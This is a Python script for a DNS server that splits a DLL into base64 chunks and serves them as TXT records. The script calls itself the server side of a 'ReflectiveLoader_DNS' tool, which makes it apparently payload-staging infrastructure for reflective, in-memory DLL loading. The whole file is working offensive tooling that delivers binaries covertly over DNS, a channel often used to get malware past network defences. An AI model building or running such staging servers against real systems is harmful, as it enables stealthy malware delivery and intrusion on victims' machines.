"""DNS server that serves a DLL as base64-encoded TXT record chunks.

Usage:
    python server.py <dll_path> [--port 53] [--host 127.0.0.1] [--domain payload.example.com] [--chunk-size 200]

Protocol:
    cnt.<domain>  TXT  -> "<number of chunks>"
    c0.<domain>   TXT  -> "<base64 chunk 0>"
    c1.<domain>   TXT  -> "<base64 chunk 1>"
    ...

Requires: pip install dnslib
"""
import argparse
import base64
import sys
from pathlib import Path

try:
    from dnslib import DNSRecord, RR, QTYPE, TXT, DNSHeader
    from dnslib.server import DNSServer, BaseResolver
except ImportError:
    sys.stderr.write("[!] Required: pip install dnslib\n")
    sys.exit(1)


class DLLResolver(BaseResolver):
    def __init__(self, domain: str, chunks: list[str], count: int):
        self.domain = domain.rstrip(".") + "."
        self.chunks = chunks
        self.count = count

    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname).lower()
        qtype = request.q.qtype

        if qtype != QTYPE.TXT:
            return reply

        # Strip the domain suffix to get the label
        suffix = "." + self.domain
        if not qname.endswith(suffix) and not qname.rstrip(".").endswith(self.domain.rstrip(".")):
            return reply

        label = qname[: -len(suffix)] if qname.endswith(suffix) else qname.split(".")[0]

        if label == "cnt":
            reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(str(self.count)), ttl=60))
        elif label.startswith("c") and label[1:].isdigit():
            idx = int(label[1:])
            if 0 <= idx < len(self.chunks):
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(self.chunks[idx]), ttl=60))

        return reply


def main():
    parser = argparse.ArgumentParser(description="DNS DLL server for ReflectiveLoader_DNS")
    parser.add_argument("dll", type=Path, help="Path to DLL file")
    parser.add_argument("--port", type=int, default=53)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--domain", default="payload.example.com")
    parser.add_argument("--chunk-size", type=int, default=200, help="Base64 chars per TXT record")
    args = parser.parse_args()

    dll_data = args.dll.read_bytes()
    b64 = base64.b64encode(dll_data).decode("ascii")
    chunks = [b64[i:i + args.chunk_size] for i in range(0, len(b64), args.chunk_size)]

    print(f"[*] Loaded {args.dll.name} ({len(dll_data)} bytes)")
    print(f"[*] Base64: {len(b64)} chars -> {len(chunks)} chunks of ~{args.chunk_size} chars")
    print(f"[*] Domain: {args.domain}")

    resolver = DLLResolver(args.domain, chunks, len(chunks))
    server = DNSServer(resolver, port=args.port, address=args.host, tcp=False)

    print(f"[*] DNS listening on {args.host}:{args.port} (UDP)")
    print(f"[*] Ctrl+C to stop")
    server.start_thread()
    try:
        server.thread.join()
    except KeyboardInterrupt:
        print("\n[*] Stopped")
        server.stop()


if __name__ == "__main__":
    main()
